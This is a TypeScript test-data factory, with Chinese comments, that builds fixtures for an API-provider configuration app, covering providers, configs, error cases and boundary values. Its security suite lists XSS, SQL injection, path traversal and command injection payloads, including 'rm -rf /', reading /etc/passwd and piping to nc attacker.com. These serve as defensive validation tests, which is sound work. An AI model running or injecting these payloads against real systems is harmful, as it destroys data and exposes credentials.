/**
 * 测试套件数据工厂
 * 提供完整的测试场景数据组合
 */

import { 
  createValidProvider, 
  createInvalidProvider, 
  createProviderCollection,
  createBoundaryProviders,
  createNetworkErrorProviders 
} from './providers.factory';

import { 
  createDefaultConfig, 
  createConfigWithProviders,
  createCorruptedConfig,
  createLegacyConfig,
  createStressTestConfig 
} from './configurations.factory';

import { 
  createSuccessResponse, 
  createErrorResponse,
  createValidationSuccessResponse,
  createValidationErrorResponse,
  createNetworkErrorResponses,
  createClaudeApiResponses 
} from './api-responses.factory';

import { createUserScenarioTestSuite } from './user-scenarios.factory';

/**
 * 创建完整的测试套件数据
 */
export function createTestSuite() {
  return {
    // Provider 测试数据
    providers: {
      valid: createValidProvider(),
      invalid: createInvalidProvider(),
      collection: createProviderCollection(),
      boundary: createBoundaryProviders(),
      networkError: createNetworkErrorProviders(),
    },
    
    // 配置测试数据
    configs: {
      default: createDefaultConfig(),
      withProviders: createConfigWithProviders(),
      corrupted: createCorruptedConfig(),
      legacy: createLegacyConfig(),
      stress: createStressTestConfig(),
    },
    
    // API 响应测试数据
    responses: {
      success: createSuccessResponse({ message: 'Success' }),
      error: createErrorResponse('Test error'),
      validation: {
        success: createValidationSuccessResponse(createValidProvider()),
        error: createValidationErrorResponse(createValidProvider(), 'connection'),
      },
      network: createNetworkErrorResponses(),
      claude: createClaudeApiResponses(),
    },
    
    // 用户场景测试数据
    userScenarios: createUserScenarioTestSuite(),
    
    // 测试辅助函数
    helpers: {
      /**
       * 创建测试用的延迟
       */
      delay: (ms: number) => new Promise(resolve => setTimeout(resolve, ms)),
      
      /**
       * 创建随机字符串
       */
      randomString: (length: number = 10) => {
        return Math.random().toString(36).substring(2, 2 + length);
      },
      
      /**
       * 创建测试用的时间戳
       */
      timestamp: () => new Date().toISOString(),
      
      /**
       * 创建测试用的 UUID
       */
      uuid: () => {
        return 'test-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
      },
    },
  };
}

/**
 * 创建性能测试数据
 */
export function createPerformanceTestSuite() {
  return {
    // 大量数据测试
    largeDataset: {
      providers: Array.from({ length: 1000 }, (_, i) => 
        createValidProvider({ name: `Provider ${i + 1}` })
      ),
      config: createStressTestConfig(),
    },
    
    // 并发测试数据
    concurrency: {
      simultaneous: Array.from({ length: 50 }, () => createValidProvider()),
      sequential: Array.from({ length: 100 }, () => createValidProvider()),
    },
    
    // 内存测试数据
    memory: {
      heavyObjects: Array.from({ length: 10 }, () => ({
        ...createValidProvider(),
        largeData: 'x'.repeat(1024 * 1024), // 1MB string
      })),
    },
  };
}

/**
 * 创建安全测试数据
 */
export function createSecurityTestSuite() {
  return {
    // XSS 攻击载荷
    xssPayloads: [
      '<script>alert("xss")</script>',
      '"><script>alert("xss")</script>',
      'javascript:alert("xss")',
      '<img src=x onerror=alert("xss")>',
      '<svg onload=alert("xss")>',
    ],
    
    // SQL 注入载荷
    sqlInjectionPayloads: [
      "'; DROP TABLE providers; --",
      "' OR '1'='1",
      "1' UNION SELECT * FROM providers --",
      "'; INSERT INTO providers VALUES ('malicious') --",
    ],
    
    // 命令注入载荷
    commandInjectionPayloads: [
      '; rm -rf /',
      '&& cat /etc/passwd',
      '| nc attacker.com 4444',
      '`whoami`',
      '$(id)',
    ],
    
    // 路径遍历载荷
    pathTraversalPayloads: [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    ],
    
    // 恶意配置文件
    maliciousConfigs: [
      {
        name: '<script>alert("xss")</script>',
        baseUrl: 'javascript:alert("xss")',
      },
      {
        name: '../../malicious',
        baseUrl: 'file:///etc/passwd',
      },
    ],
  };
}

/**
 * 创建错误处理测试数据
 */
export function createErrorHandlingTestSuite() {
  return {
    // 网络错误
    networkErrors: [
      new Error('ECONNREFUSED'),
      new Error('ENOTFOUND'),
      new Error('ETIMEDOUT'),
      new Error('ECONNRESET'),
      new Error('CERT_INVALID'),
    ],
    
    // API 错误
    apiErrors: [
      createErrorResponse('Unauthorized', 401),
      createErrorResponse('Forbidden', 403),
      createErrorResponse('Not Found', 404),
      createErrorResponse('Too Many Requests', 429),
      createErrorResponse('Internal Server Error', 500),
    ],
    
    // 配置错误
    configErrors: [
      createCorruptedConfig('invalid-json'),
      createCorruptedConfig('missing-fields'),
      createCorruptedConfig('wrong-types'),
    ],
    
    // 文件系统错误
    fileSystemErrors: [
      new Error('ENOENT: no such file or directory'),
      new Error('EACCES: permission denied'),
      new Error('EMFILE: too many open files'),
      new Error('ENOSPC: no space left on device'),
    ],
  };
}

/**
 * 创建边界条件测试数据
 */
export function createBoundaryTestSuite() {
  return {
    // 边界值
    boundaries: {
      empty: '',
      single: 'a',
      max: 'x'.repeat(10000),
      unicode: '🚀💻🔒',
      special: '!@#$%^&*()_+-=[]{}|;:,.<>?',
    },
    
    // 数组边界
    arrays: {
      empty: [],
      single: [createValidProvider()],
      large: Array.from({ length: 10000 }, () => createValidProvider()),
    },
    
    // 数字边界
    numbers: {
      zero: 0,
      negative: -1,
      maxInt: Number.MAX_SAFE_INTEGER,
      minInt: Number.MIN_SAFE_INTEGER,
      infinity: Infinity,
      nan: NaN,
    },
    
    // 日期边界
    dates: {
      epoch: new Date(0),
      future: new Date(2099, 11, 31),
      invalid: new Date('invalid'),
    },
  };
}